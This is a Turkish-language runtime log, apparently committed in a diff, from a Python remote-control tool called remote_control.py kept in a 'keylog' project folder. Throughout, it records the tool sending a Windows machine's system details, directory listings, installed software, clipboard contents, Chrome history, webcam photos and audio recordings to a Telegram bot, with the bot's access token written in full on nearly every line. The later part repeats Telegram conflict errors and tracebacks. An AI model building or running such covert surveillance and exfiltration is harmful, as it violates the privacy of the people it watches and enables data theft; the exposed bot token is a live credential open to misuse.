+2025-05-26 21:29:15,543 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:15,545 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dizin] .android
+[Dizin] .cache...
+2025-05-26 21:29:18,222 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:20,606 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:21,266 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:21,266 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users...
+2025-05-26 21:29:23,870 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:24,540 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:24,541 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dizin] All Users
+[Dizin] Defau...
+2025-05-26 21:29:27,221 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:30,558 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:31,246 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:31,247 - INFO - Mesaj gönderildi: Dizin değiştirildi: C:\Users\All Users...
+2025-05-26 21:29:33,469 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:33,471 - WARNING - Komutlar arası bekleme süresi yetersiz. 3 saniye bekleyin.
+2025-05-26 21:29:34,265 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:34,267 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:29:36,941 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:38,598 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:29:39,294 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:29:39,294 - INFO - Mesaj gönderildi: Dizin İçeriği (.):
+[Dosya] 0e828233-8401-4fc7-9684...
+2025-05-26 21:29:41,969 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:04,332 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:04,333 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:32:05,062 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:05,063 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:32:05,703 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:05,704 - WARNING - Program henüz başlatılmadı. Sadece /help komutu kullanılabilir.
+2025-05-26 21:32:06,395 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:06,397 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:32:07,105 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:07,106 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:32:09,738 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:14,379 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:16,231 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:17,069 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:17,070 - INFO - Mesaj gönderildi: Yüklü Yazılımlar:
+Google Play Games Beta (v25.5.10...
+2025-05-26 21:32:19,740 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:21,451 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:22,145 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:22,146 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:32:24,845 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:27,568 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:29,464 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:32:29,465 - INFO - Dosya gönderildi: webcam_20250526_213228.jpg
+2025-05-26 21:32:32,400 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:37,116 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:39,753 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:43,840 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:44,582 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:44,583 - INFO - Mesaj gönderildi: Bilinmeyen komut: /clipboard
+Kullanılabilir komutl...
+2025-05-26 21:32:47,369 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:49,092 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:49,876 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:49,877 - INFO - Mesaj gönderildi: Bilinmeyen komut: /clipboard
+Kullanılabilir komutl...
+2025-05-26 21:32:52,591 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:56,525 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:32:57,277 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:32:57,279 - INFO - Mesaj gönderildi: Tarayıcı Geçmişi:
+Chrome geçmişi bulundu...
+2025-05-26 21:32:59,989 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:04,631 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:07,286 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:10,808 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:11,581 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:33:11,582 - INFO - Mesaj gönderildi: 15 saniyelik ses kaydı başlatıldı......
+2025-05-26 21:33:28,087 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendDocument "HTTP/1.1 200 OK"
+2025-05-26 21:33:28,088 - INFO - Dosya gönderildi: audio_20250526_213326.wav
+2025-05-26 21:33:30,730 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:35,395 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:38,206 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:42,850 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:45,510 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:50,172 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:51,936 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:33:52,748 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:33:52,749 - INFO - Mesaj gönderildi: Program durduruldu!...
+2025-05-26 21:35:21,318 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:21,319 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-26 21:35:22,020 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:22,021 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-26 21:35:22,688 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:22,689 - WARNING - Program henüz başlatılmadı. Sadece /help komutu kullanılabilir.
+2025-05-26 21:35:23,400 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:23,401 - INFO - Mesaj gönderildi: Güvenlik nedeniyle bu komut reddedildi. Lütfen dah...
+2025-05-26 21:35:26,052 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:30,700 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:32,349 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:33,063 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:33,064 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-26 21:35:35,706 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:38,197 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:38,950 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:38,951 - INFO - Mesaj gönderildi: Pano İçeriği:
+PS C:\Users\syefo\OneDrive\Belgeler\...
+2025-05-26 21:35:41,653 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:46,332 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:48,559 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:49,265 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:35:49,265 - INFO - Mesaj gönderildi: Komut Çıktısı:
+Komut başarıyla çalıştırıldı....
+2025-05-26 21:35:51,914 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:56,562 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:35:59,209 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:36:00,869 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:36:01,549 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:36:01,550 - INFO - Mesaj gönderildi: Tarayıcı Geçmişi:
+Chrome geçmişi bulundu...
+2025-05-26 21:36:04,215 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:36:08,866 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:36:11,188 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-26 21:36:11,861 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-26 21:36:11,862 - INFO - Mesaj gönderildi: Program durduruldu!...
+2025-05-28 05:35:14,643 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-28 05:35:14,644 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-28 05:35:15,324 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-28 05:35:15,324 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-28 05:35:17,042 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-28 05:49:32,013 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-28 05:49:32,014 - INFO - Mesaj gönderildi: Uzaktan Kontrol Başlatıldı
+
+Sistem Bilgileri:
+Sist...
+2025-05-28 05:49:32,747 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-28 05:49:32,748 - INFO - Mesaj gönderildi: Komutlar için /help yazın...
+2025-05-28 05:49:34,454 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-28 05:49:36,322 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-28 05:49:37,113 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/sendMessage "HTTP/1.1 200 OK"
+2025-05-28 05:49:37,114 - INFO - Mesaj gönderildi: 
+                Kullanılabilir Komutlar:
+        ...
+2025-05-28 05:49:40,013 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 200 OK"
+2025-05-28 05:49:42,852 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 409 Conflict"
+2025-05-28 05:49:42,857 - ERROR - Komut kontrolü sırasında hata: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+Traceback (most recent call last):
+  File "c:\Users\syefo\OneDrive\Belgeler\Masaüstü\project github keylog\remote_control.py", line 830, in check_commands
+    updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 4601, in get_updates
+    await self._post(
+    ^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    ),
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 697, in _post
+    return await self._do_post(
+           ^^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 726, in _do_post
+    result = await request.post(
+             ^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 197, in post
+    result = await self._request_wrapper(
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 355, in _request_wrapper
+    raise Conflict(message)
+telegram.error.Conflict: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+
+2025-05-28 05:49:42,858 - INFO - 5 saniye sonra yeniden bağlanmayı deneyecek...
+2025-05-28 05:49:50,218 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 409 Conflict"
+2025-05-28 05:49:50,220 - ERROR - Komut kontrolü sırasında hata: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+Traceback (most recent call last):
+  File "c:\Users\syefo\OneDrive\Belgeler\Masaüstü\project github keylog\remote_control.py", line 830, in check_commands
+    updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 4601, in get_updates
+    await self._post(
+    ^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    ),
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 697, in _post
+    return await self._do_post(
+           ^^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 726, in _do_post
+    result = await request.post(
+             ^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 197, in post
+    result = await self._request_wrapper(
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 355, in _request_wrapper
+    raise Conflict(message)
+telegram.error.Conflict: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+
+2025-05-28 05:49:50,221 - INFO - 5 saniye sonra yeniden bağlanmayı deneyecek...
+2025-05-28 05:49:57,639 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 409 Conflict"
+2025-05-28 05:49:57,641 - ERROR - Komut kontrolü sırasında hata: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+Traceback (most recent call last):
+  File "c:\Users\syefo\OneDrive\Belgeler\Masaüstü\project github keylog\remote_control.py", line 830, in check_commands
+    updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 4601, in get_updates
+    await self._post(
+    ^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    ),
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 697, in _post
+    return await self._do_post(
+           ^^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 726, in _do_post
+    result = await request.post(
+             ^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 197, in post
+    result = await self._request_wrapper(
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 355, in _request_wrapper
+    raise Conflict(message)
+telegram.error.Conflict: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+
+2025-05-28 05:49:57,642 - INFO - 5 saniye sonra yeniden bağlanmayı deneyecek...
+2025-05-28 05:50:04,969 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 409 Conflict"
+2025-05-28 05:50:04,973 - ERROR - Komut kontrolü sırasında hata: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+Traceback (most recent call last):
+  File "c:\Users\syefo\OneDrive\Belgeler\Masaüstü\project github keylog\remote_control.py", line 830, in check_commands
+    updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 4601, in get_updates
+    await self._post(
+    ^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    ),
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 697, in _post
+    return await self._do_post(
+           ^^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 726, in _do_post
+    result = await request.post(
+             ^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 197, in post
+    result = await self._request_wrapper(
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 355, in _request_wrapper
+    raise Conflict(message)
+telegram.error.Conflict: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+
+2025-05-28 05:50:04,974 - INFO - 5 saniye sonra yeniden bağlanmayı deneyecek...
+2025-05-28 05:50:12,603 - INFO - HTTP Request: POST https://api.telegram.org/bot7688524724:AAH9_3UmZaRupElnKd_5jqwRcyXsIq0omKA/getUpdates "HTTP/1.1 409 Conflict"
